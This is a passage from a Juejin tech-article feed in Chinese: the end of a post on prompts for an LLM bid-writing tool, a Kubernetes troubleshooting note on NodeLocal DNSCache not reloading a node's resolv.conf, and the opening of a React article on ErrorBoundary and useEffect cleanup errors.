<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChapterContentRequest</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-string">"""单章节内容生成请求"""</span>
    chapter: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] = Field(..., description=<span class="hljs-string">"章节信息"</span>)
    parent_chapters: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]] = Field(<span class="hljs-literal">None</span>, description=<span class="hljs-string">"上级章节列表"</span>)
    sibling_chapters: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]] = Field(<span class="hljs-literal">None</span>, description=<span class="hljs-string">"同级章节列表"</span>)
    project_overview: <span class="hljs-built_in">str</span> = Field(<span class="hljs-string">""</span>, description=<span class="hljs-string">"项目概述"</span>)
</code></pre>
<ul>
<li><strong>chapter：</strong> 本章节信息，不多说，这是必须的</li>
</ul>

<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.2.2"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"技术实力"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"技术研发能力和创新情况"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong>parent_chapters：</strong> 上级章节列表，为了保持连贯性</li>
<li><strong>sibling_chapters：</strong> 同级章节列表，为了生成内容不重复</li>
<li><strong>project_overview：</strong> 项目概述，这是核心，让AI知道自己要写的标书的核心需求</li>
</ul>
<h2 data-id="heading-1">二、核心提示词</h2>
<p><strong>SystemPrompt</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">你是一个专业的标书编写专家，负责为投标文件的技术标部分生成具体内容。

要求：
<span class="hljs-bullet">1.</span> 内容要专业、准确，与章节标题和描述保持一致
<span class="hljs-bullet">2.</span> 这是技术方案，不是宣传报告，注意朴实无华，不要假大空
<span class="hljs-bullet">3.</span> 语言要正式、规范，符合标书写作要求，但不要使用奇怪的连接词，不要让人觉得内容像是AI生成的
<span class="hljs-bullet">4.</span> 内容要详细具体，避免空泛的描述
<span class="hljs-bullet">5.</span> 注意避免与同级章节内容重复，保持内容的独特性和互补性
<span class="hljs-bullet">6.</span> 直接返回章节内容，不生成标题，不要任何额外说明或格式标记
</code></pre>
<p><strong>UserPrompt</strong>
这个就需要拼接一下了</p>
<pre><code class="hljs language-markdown" lang="markdown">项目概述信息：
{project<span class="hljs-emphasis">_overview}

请为以下标书章节生成具体内容：

{context_</span>info if context<span class="hljs-emphasis">_info else ''}

当前章节信息：
章节ID: {chapter_</span>id}
章节标题: {chapter<span class="hljs-emphasis">_title}
章节描述: {chapter_</span>description}

请根据项目概述信息和上述章节层级关系，生成详细的专业内容，确保与上级章节的内容逻辑相承，同时避免与同级章节内容重复，突出本章节的独特性和技术方案的优势。
</code></pre>
<p>context_info是拼接的上级、统计节点信息</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 构建上下文信息</span>
context_info = <span class="hljs-string">""</span>

<span class="hljs-comment"># 上级章节信息</span>
<span class="hljs-keyword">if</span> parent_chapters:
    context_info += <span class="hljs-string">"上级章节信息：\n"</span>
    <span class="hljs-keyword">for</span> parent <span class="hljs-keyword">in</span> parent_chapters:
        context_info += <span class="hljs-string">f"- <span class="hljs-subst">{parent[<span class="hljs-string">'id'</span>]}</span> <span class="hljs-subst">{parent[<span class="hljs-string">'title'</span>]}</span>\n  <span class="hljs-subst">{parent[<span class="hljs-string">'description'</span>]}</span>\n"</span>

<span class="hljs-comment"># 同级章节信息（排除当前章节）</span>
<span class="hljs-keyword">if</span> sibling_chapters:
    context_info += <span class="hljs-string">"同级章节信息（请避免内容重复）：\n"</span>
    <span class="hljs-keyword">for</span> sibling <span class="hljs-keyword">in</span> sibling_chapters:
        <span class="hljs-keyword">if</span> sibling.get(<span class="hljs-string">'id'</span>) != chapter_id:  <span class="hljs-comment"># 排除当前章节</span>
            context_info += <span class="hljs-string">f"- <span class="hljs-subst">{sibling.get(<span class="hljs-string">'id'</span>, <span class="hljs-string">'unknown'</span>)}</span> <span class="hljs-subst">{sibling.get(<span class="hljs-string">'title'</span>, <span class="hljs-string">'未命名'</span>)}</span>\n  <span class="hljs-subst">{sibling.get(<span class="hljs-string">'description'</span>, <span class="hljs-string">''</span>)}</span>\n"</span>

</code></pre>
<p>拼接后的完整user_prompt示例</p>
<blockquote>
<p>请为以下标书章节生成具体内容：
上级章节信息：</p>
<ul>
<li>1 投标文件技术要求响应程度
对项目技术要求的响应和符合情况</li>
<li>1.1 技术规格响应
详细描述投标产品技术参数与招标技术要求的符合性</li>
</ul>
<p>同级章节信息（请避免内容重复）：</p>
<ul>
<li>1.1.2 技术文件完整性
提供的技术文件是否齐全、规范
当前章节信息：
章节ID: 1.1.1
章节标题: 灯具规格符合性
章节描述: 逐项说明各灯具规格与招标文件要求的匹配情况</li>
</ul>
<p>请根据项目概述信息和上述章节层级关系，生成详细的专业内容，确保与上级章节的内容逻辑相承，同时避免与同级章节内容重复，突出本章节的独特性和技术方案的优势。</p>
</blockquote>
<p>就这么简单，生成正文不需要过多的逻辑推理，用最普通的大模型即可实现稳定输出，也几乎不存在生成失败的问题~</p>
<h2 data-id="heading-2">完整代码已开源</h2>
<p>Github： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyibiaoai%2Fyibiao-simple" target="_blank" title="https://github.com/yibiaoai/yibiao-simple" ref="nofollow noopener noreferrer">github.com/yibiaoai/yi…</a></p>
<p>Gitee： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fyibiao-ai%2Fyibiao-simple" target="_blank" title="https://gitee.com/yibiao-ai/yibiao-simple" ref="nofollow noopener noreferrer">gitee.com/yibiao-ai/y…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kubernetes 节点 DNS 解析异常问题排查与解决方案]]></title>    <link>https://juejin.cn/post/7579872561675960329</link>    <guid>https://juejin.cn/post/7579872561675960329</guid>    <pubDate>2025-12-05T03:07:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579872561675960329" data-draft-id="7579872561675796489" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kubernetes 节点 DNS 解析异常问题排查与解决方案"/> <meta itemprop="keywords" content="后端,Kubernetes"/> <meta itemprop="datePublished" content="2025-12-05T03:07:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="壹米饭"/> <meta itemprop="url" content="https://juejin.cn/user/4178616274387758"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kubernetes 节点 DNS 解析异常问题排查与解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4178616274387758/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    壹米饭
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:07:51.000Z" title="Fri Dec 05 2025 03:07:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>因为 NodeLocal DNSCache 未加载更新后的节点 resolv.conf 导致 Pod 无法解析外部域名</strong></p>
<hr/>
<h2 data-id="heading-0">一、问题现象</h2>
<p>在 Kubernetes 集群中，部署的应用 Pod 在调度到 <strong>worker4 节点</strong>时可以正常访问外部服务 <code>qyapi.weixin.qq.com</code>，但当调度到 <strong>worker3 节点</strong>时，Java 应用抛出如下异常：</p>
<pre><code class="hljs language-csharp" lang="csharp">Caused <span class="hljs-keyword">by</span>: java.net.UnknownHostException: qyapi.weixin.qq.com
</code></pre>
<p>经初步排查：</p>
<ul>
<li>worker3 节点本身可通过 <code>ping qyapi.weixin.qq.com</code> 正常解析并连通；</li>
<li>worker4 节点无此问题；</li>
<li>两节点操作系统及网络环境基本一致。</li>
</ul>
<hr/>
<h2 data-id="heading-1">二、根因分析</h2>
<h3 data-id="heading-2">1. 集群启用了 NodeLocal DNSCache</h3>
<p>通过检查发现，集群部署了 <strong>NodeLocal DNSCache</strong>（DaemonSet，标签 <code>k8s-app=nodelocaldns</code>），用于优化 Pod 的 DNS 查询性能。其工作原理如下：</p>
<ul>
<li>每个节点运行一个本地 CoreDNS 实例，监听 IP（通常为 <code>169.254.20.10</code>）；</li>
<li>Pod 的 <code>/etc/resolv.conf</code> 中 <code>nameserver</code> 被设置为此本地地址；</li>
<li>NodeLocal DNSCache 将集群内部域名请求转发给 CoreDNS，外部域名请求则转发给<strong>节点 <code>/etc/resolv.conf</code> 中配置的上游 DNS 服务器</strong>。</li>
</ul>
<h3 data-id="heading-3">2. NodeLocal DNSCache 仅在启动时读取 <code>/etc/resolv.conf</code></h3>
<ul>
<li>NodeLocal DNSCache Pod <strong>在启动时读取所在节点的 <code>/etc/resolv.conf</code></strong>，获取上游 DNS 配置；</li>
<li><strong>不会动态监听或重新加载该文件的后续变更</strong>；</li>
<li>若节点的 DNS 配置发生变化（如修复错误配置），必须<strong>重启 NodeLocal DNSCache Pod</strong> 才能生效。</li>
</ul>
<h3 data-id="heading-4">3. 问题发生过程</h3>
<ol>
<li>worker3 节点初始的 <code>/etc/resolv.conf</code> 配置有误（如 nameserver 不可达）；</li>
<li>NodeLocal DNSCache Pod 启动时加载了错误的上游 DNS 配置；</li>
<li>即使后续手动修正了 worker3 的 <code>/etc/resolv.conf</code>，NodeLocal DNSCache 仍使用旧配置；</li>
<li>导致调度到 worker3 的 Pod 无法解析外部域名，而节点自身（直接使用 <code>/etc/resolv.conf</code>）可正常解析。</li>
</ol>
<hr/>
<h2 data-id="heading-5">三、解决方案</h2>
<h3 data-id="heading-6">✅ 步骤 1：确保节点 DNS 配置正确</h3>
<p>将 worker3 的 <code>/etc/resolv.conf</code> 修改为与正常节点（如 worker4）一致，例如：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 注意这里，修改为与正常节点（如 worker4）一致</span>
nameserver <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span>

</code></pre>
<blockquote>
<p>💡 建议通过系统级网络管理工具（如 NetworkManager、systemd-resolved）进行持久化配置，避免被 DHCP 或云平台覆盖。</p>
</blockquote>
<h3 data-id="heading-7">✅ 步骤 2：重启 NodeLocal DNSCache Pod</h3>
<p>强制重建 worker3 上的 NodeLocal DNSCache 实例，使其加载最新的 <code>/etc/resolv.conf</code>：</p>
<pre><code class="hljs language-ini" lang="ini">kubectl delete pods -n kube-system -l <span class="hljs-attr">k8s-app</span>=nodelocaldns
</code></pre>
<p>Kubernetes DaemonSet 控制器会自动在所有节点（包括 worker3）上创建新的 Pod。</p>
<h3 data-id="heading-8">✅ 步骤 3：验证修复结果</h3>
<p>在 worker3 上部署测试 Pod，验证外部域名解析：</p>
<pre><code class="hljs language-ini" lang="ini">kubectl run debug <span class="hljs-attr">--image</span>=busybox:<span class="hljs-number">1.28</span> --rm -it --restart=Never \
  <span class="hljs-attr">--overrides</span>=<span class="hljs-string">'{"spec":{"nodeSelector":{"kubernetes.io/hostname":"worker3"}}}'</span> \
  -- nslookup qyapi.weixin.qq.com
</code></pre>
<p>预期输出应包含有效的 IP 地址，无超时或错误。</p>
<hr/>
<h2 data-id="heading-9">四、经验总结与建议</h2>

























<table><thead><tr><th>项目</th><th>说明</th></tr></thead><tbody><tr><td><strong>关键认知</strong></td><td>NodeLocal DNSCache <strong>不会动态重载</strong> <code>/etc/resolv.conf</code>，修改后必须重启 Pod</td></tr><tr><td><strong>运维规范</strong></td><td>修改节点 DNS 配置后，应同步执行 <code>kubectl delete pod -n kube-system -l k8s-app=nodelocaldns</code></td></tr><tr><td><strong>配置持久化</strong></td><td>避免直接编辑 <code>/etc/resolv.conf</code>，推荐使用系统网络管理工具或云平台配置</td></tr><tr><td><strong>监控建议</strong></td><td>可通过 Prometheus + CoreDNS 指标监控 DNS 解析失败率，提前发现类似问题</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">五、附录：相关组件说明</h2>
<h3 data-id="heading-11">NodeLocal DNSCache 架构简图</h3>
<pre><code class="hljs language-scss" lang="scss">Pod (nameserver: <span class="hljs-number">169.254</span>.<span class="hljs-number">20.10</span>)
        ↓
NodeLocal DNSCache (本地 CoreDNS, 运行于每个节点)
        ↓
上游 DNS（来自节点 /etc/resolv<span class="hljs-selector-class">.conf</span>）
        ↓
公网/内网 DNS 服务器
</code></pre>
<h3 data-id="heading-12">查看 NodeLocal DNSCache 配置</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 查看 ConfigMap</span>
kubectl <span class="hljs-keyword">get</span> cm nodelocaldns -n kube-system -o yaml

<span class="hljs-meta"># 查看 Pod 状态</span>
kubectl <span class="hljs-keyword">get</span> pods -n kube-system -l k8s-app=nodelocaldns -o wide
</code></pre>
<hr/>
<p><strong>记录人</strong>：壹米饭
<strong>记录时间</strong>：2025年12月5日<br/>
<strong>适用环境</strong>：启用 NodeLocal DNSCache 的 Kubernetes 集群（v1.18+）</p>
<blockquote>
<p>📌 <strong>一句话总结</strong>：改了节点 DNS 配置？别忘了重启 nodelocaldns！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？]]></title>    <link>https://juejin.cn/post/7579961957221007387</link>    <guid>https://juejin.cn/post/7579961957221007387</guid>    <pubDate>2025-12-05T03:09:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579961957221007387" data-draft-id="7579917791764660251" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2025-12-05T03:09:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiechao"/> <meta itemprop="url" content="https://juejin.cn/user/377887728340302"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/377887728340302/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiechao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:09:23.000Z" title="Fri Dec 05 2025 03:09:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？</h2>
<p>在函数组件中，useEffect 的返回方法（通常称为 “清理函数”）承担着类似类组件 componentWillUnmount 的职责，比如取消定时器、清除订阅、终止未完成的接口请求等。最近有开发者问：“如果在这个清理函数里不小心抛出了错误，ErrorBoundary 能捕获到吗？” 这个问题恰好卡在 ErrorBoundary 的 “能力边界” 上，我们结合之前讲过的限制来拆解分析。</p>
<h4 data-id="heading-1">先给结论：清理函数中的错误，ErrorBoundary 无法捕获</h4>
<p>要理解原因，得先回顾两个关键前提：</p>
<ol>
<li>ErrorBoundary 仅能捕获 <strong>子组件渲染、生命周期（类组件）、构造函数中的同步错误</strong>；</li>
</ol>

<ol start="2">
<li>useEffect 清理函数的执行时机，是在组件卸载时或依赖项更新导致 effect 重新执行前 —— 这个时机<strong>脱离了组件的 “渲染流程”</strong> ，属于 “组件销毁 / 更新后的收尾操作”，和我们之前讲的 “异步操作错误”“事件处理错误” 本质上是同一类：不在 ErrorBoundary 的监控范围内。</li>
</ol>
<h4 data-id="heading-2">用实例验证：清理函数抛错会直接崩溃</h4>
<p>我们写一段代码来模拟这个场景：在 useEffect 清理函数中故意抛出错误，看看 ErrorBoundary 是否生效。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 先定义基础的 ErrorBoundary 组件（复用之前的逻辑）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  state = { <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> };
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> };
  }
  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ErrorBoundary 捕获到错误：'</span>, error);
  }
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>页面出错了，但被捕获了~<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;
  }
